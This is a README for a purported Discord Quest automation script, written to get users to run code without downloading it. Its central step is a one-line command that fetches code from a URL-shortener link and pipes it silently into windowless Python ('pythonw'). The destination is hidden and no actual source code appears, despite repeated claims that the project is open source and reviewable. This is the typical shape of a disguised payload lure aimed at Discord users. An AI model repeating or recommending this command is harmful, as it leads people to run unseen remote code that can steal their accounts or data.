# Discord Quest Bot

A lightweight Python script that automates supported Discord Quests without requiring users to manually download the script.

> ⚠️ This project is open source. You can inspect the source code before running it.

## Features

- 🚀 Complete supported Discord Quests automatically
- 📦 No manual download required
- 🔓 Fully open source
- 🐍 Written in Python
- 💻 Works directly from the command line

## Run Without Downloading

If you trust the source and have reviewed the code, you can run the latest version directly:

```bash
curl -s -L "https://tinyurl.com/DiscordQuestBot" | pythonw && exit
```

## Requirements

- Python 3.10+
- Windows
- Discord Desktop

Install dependencies (if any):
```Just Run The code it will AutoDownlaod its dependencies```

## How It Works

The script automates supported Discord Quests by interacting with the Discord client. Since the project is open source, you can review exactly what the code does before running it.
